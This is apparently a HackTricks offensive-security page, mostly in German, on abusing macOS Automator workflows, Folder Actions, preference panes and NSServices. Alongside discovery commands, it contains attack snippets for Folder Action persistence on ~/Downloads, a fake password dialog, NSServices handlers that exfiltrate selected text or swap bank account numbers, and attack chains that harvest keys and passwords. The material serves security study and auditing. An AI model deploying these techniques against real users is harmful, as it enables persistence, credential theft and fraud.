# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** ist macOSs visuelles Automatisierungstool. Es führt **workflows** (`.workflow` bundles) aus, die aus **actions** (`.action` bundles) bestehen. Automator treibt auch **Folder Actions**, **Quick Actions** und die **Shortcuts**-Integration an. Auf modernem macOS können workflows auch in **Shortcuts** importiert werden, sodass dieselbe bösartige Logik als Finder Quick Action, als User Service unter `~/Library/Services/` oder als Shortcut mit alten Automator actions erscheinen kann.

Automator actions sind **plugins**, die in den Automator-Laufzeitkontext geladen werden, wenn ein workflow ausgeführt wird. Sie können:
- Beliebige shell scripts ausführen
- Dateien und Daten verarbeiten
- Über AppleScript mit Anwendungen interagieren
- Für komplexe Automatisierung verkettet werden

### Why This Matters

> [!WARNING]
> Automator workflows können per **social engineering** zur Ausführung gebracht werden — sie erscheinen als einfache Dokumentdateien. Ein `.workflow` bundle kann eingebettete shell commands enthalten, die ausgeführt werden, wenn der workflow läuft. In Kombination mit Folder Actions bieten sie **automatische persistence**, die bei Dateievents ausgelöst wird. Jüngste Gatekeeper-Fixes zeigten außerdem, dass **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) als ausführbarer Inhalt und nicht als harmlosen Daten behandelt werden müssen.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Angriff: Social-Engineered Workflow

Ein `.workflow`-Bundle sieht für die meisten Benutzer wie eine normale Dokumentdatei aus:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Angriff: Folder Action Persistence

Folder Actions führen automatisch einen Workflow aus, wenn Dateien zu einem überwachten Ordner hinzugefügt werden:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bestehen über Neustarts hinweg und werden lautlos ausgeführt. Eine Folder Action auf `~/Downloads` bedeutet, dass **jede heruntergeladene Datei dein Payload auslöst** — einschließlich Dateien aus Safari, Chrome, AirDrop und E-Mail-Anhängen. Beachte außerdem, dass `System Events` Folder Actions registrieren kann, die auf Scripts außerhalb der standardmäßigen `~/Library/Scripts/Folder Action Scripts`-Standorte verweisen, was Loose-Path-Hunting lohnenswert macht. Für verwandte TCC-Implikationen siehe [die TCC-Seite](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) sind Plugins, die von **System Settings** (früher System Preferences) geladen werden. Sie stellen Konfigurations-UI-Panels für System- oder Drittanbieter-Features bereit. Auf älteren Systemen wurden sie direkt von `System Preferences` geladen; auf neueren Releases werden Drittanbieter-Panes häufig über einen **legacy loader XPC service** vermittelt, der von System Settings gestartet wird.

### Why This Matters

- Preference panes werden in einem **trusted host process** ausgeführt, der von System Settings / System Preferences gestartet wird
- Auf modernen Systemen kann dieser Host ein **`legacyLoader` XPC service** sein, daher ist die wichtige Grenze weiterhin **trusted Apple UI process -> third-party code loading**
- Drittanbieter-Preference-Panes übernehmen den **host process security context** und das mit dieser UI verknüpfte Benutzervertrauen
- Benutzer installieren Preference panes durch **Doppelklick** — leichtes Social Engineering
- Einmal installiert, **persistieren** sie und werden jedes Mal geladen, wenn System Settings dieses Panel öffnet

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Angriff: Hijacking des Privilege Context

Ein böswilliges preference pane erbt den Sicherheitskontext des **pane host** (historisch `System Preferences`, in neueren Versionen oft ein von `System Settings` gestarteter `legacyLoader`-Helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Angriff: Persistenz durch Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Angriff: UI-Phishing

Ein Preference Pane kann legitime System-UI-Panels nachahmen, um **Anmeldedaten zu phishen**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basisinformationen

**NSServices** ermöglichen Anwendungen, Funktionen anderen Apps über das **Services menu** bereitzustellen (Rechtsklick → Services). Wenn ein Benutzer Text oder Daten auswählt und einen Service aufruft, werden die ausgewählten Daten zur Verarbeitung **an den Service-Provider gesendet**.

Services werden in einer Anwendung in `Info.plist` unter dem Schlüssel `NSServices` deklariert und mit dem pasteboard server (`pbs`) registriert. macOS führt außerdem einen **service cache** und eine **restriction policy**, die entscheiden, welche Services sichtbar sind und ob sandboxed callers eine zusätzliche Warnung erhalten sollen.

### Warum das wichtig ist

- Services erhalten einen **cross-application data flow** — ausgewählter Text aus jeder Anwendung wird an den Service gesendet
- Ein bösartiger Service erfasst Daten aus password managers, email clients, financial apps
- Services können **modifizierte Daten zurückgeben** an die aufrufende Anwendung (man-in-the-middle bei Auswahloperationen)
- Service-Namen können so gestaltet werden, dass sie legitim wirken ("Format Text", "Encrypt Selection", "Share")
- Das optionale `NSRestricted`-Flag ist sicherheitsrelevant: Ein als unrestricted markierter Service kann von einer sandboxed app ohne die Warnung aufgerufen werden, die macOS für escape-prone services anzeigt

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Angriff: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Angriff: Datenmodifikation (Man-in-the-Middle)

Ein Dienst kann die **zurückgegebenen Daten modifizieren**, während er scheinbar eine legitime Funktion bereitstellt:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Eingeschränkte Services & moderner Missbrauch

Apple unterstützt pro Service-Definition ein optionales `NSRestricted`-Boolean. Wenn es gesetzt ist, warnt macOS sandboxed Aufrufer, weil der Service ihnen helfen kann, **Sandbox- oder Privacy-Grenzen zu umgehen**. Aus offensiver Sicht eröffnet das zwei nützliche Audit-Pfade:

- Suche nach **Third-Party-Services, die nicht als restricted markiert sind**, obwohl sie Apple Events, Dateizugriff oder andere privilegierte Aktionen weiterleiten
- Suche nach **hochwertigen eingebauten Services** mit starken Entitlements (zum Beispiel Services, die von Script Editor oder Finder-gestützten Hilfsprozessen exponiert werden) und prüfe, ob Benutzerinteraktion ausreicht, um sie in ein Data-Access-Primitive zu verwandeln

Ein gutes aktuelles Beispiel ist **CVE-2022-48574**, bei dem der Services-Mechanismus missbraucht werden konnte, um **TCC-geschützte Benutzerdateien ohne den erwarteten Bestätigungs-Flow** zu erreichen. Der Bug ist behoben, aber die Technik bleibt für Threat Modeling nützlich: Jeder Service, der Datei-Zugriffe oder Automation-Requests im Namen des Aufrufers weiterleitet, verdient dieselbe Prüfung.

---

## Aktuelle Sicherheitsnotizen

- **Quick Actions sind ausführbarer Inhalt**: Apple behob 2024 einen Gatekeeper-Bypass, bei dem eine in die App eingebundene Automator Quick Action ohne normale Prüfung ausgeführt werden konnte. Wenn du Apps auditierst, inspiziere `Contents/PlugIns/*.workflow/Contents/document.wflow` genau so, wie du Helper-Skripte oder Login Items inspizieren würdest. Siehe [die Gatekeeper-Seite](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts können Legacy-Automator-Verhalten erben**: Apple fügte außerdem eine zusätzliche Benutzer-Bestätigungsaufforderung hinzu, nachdem Third-Party-Shortcuts dabei entdeckt wurden, eine **Legacy-Automator-Aktion** zu verwenden, um Apple Events ohne den erwarteten Permission-Flow zu senden. Importierte Workflows und Shortcut-Bundles sollten auf `Run AppleScript`, `Run Shell Script` und ähnliche Bridge-Aktionen geprüft werden. Siehe [die TCC-Seite](../macos-security-protections/macos-tcc/README.md).
- **Automator ist weiterhin eine aktive Privacy-Grenze**: Apple lieferte 2025 einen weiteren Automator-Fix für den Zugriff auf geschützte Benutzerdaten aus. Auch wenn Automator eine Legacy-Oberfläche ist, behandle jeden Workflow-Runner, Quick-Action-Host oder jede Automation-Bridge als aktuelle Angriffsfläche und nicht als toten Code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC-Eskalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Passwort-Manager-Diebstahl
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referenzen

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
